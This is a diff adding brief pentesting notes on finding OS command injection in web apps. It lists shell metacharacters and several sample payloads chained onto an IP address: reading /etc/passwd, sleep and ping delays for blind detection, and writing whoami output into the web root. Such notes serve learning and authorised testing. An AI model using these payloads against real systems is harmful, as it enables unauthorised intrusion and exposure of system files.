@@ -1,0 +1,17 @@
+Hunting for Command injection:
+
+1- Map the application
+2- identify all instances where the web application appears to be interacting with the underlying operating system.
+
+-->>> shell metacharacters : &,&&,|,||,;,\n,`,$() 
+
+3- For in-band comman injection , analyze the response of the application to determine if it's vulnerable .
+- Concatenate another command 
+->> 127.0.0.1 && cat /etc/passwd
+
+4- For blind command injection 
+- Trigger a time delay using the ping or sleep command .
+->> 127.0.0.1 && sleep  10 &	  "Unix"
+->> 127.0.0.1 && ping -c 10 127.0.0.1 &	  "Unix and Windows"
+- Output the response of the command in the web root and retrive the file directly using browser
+->> 127.0.0.1 & whoami > /var/www/static/whoami.txt &
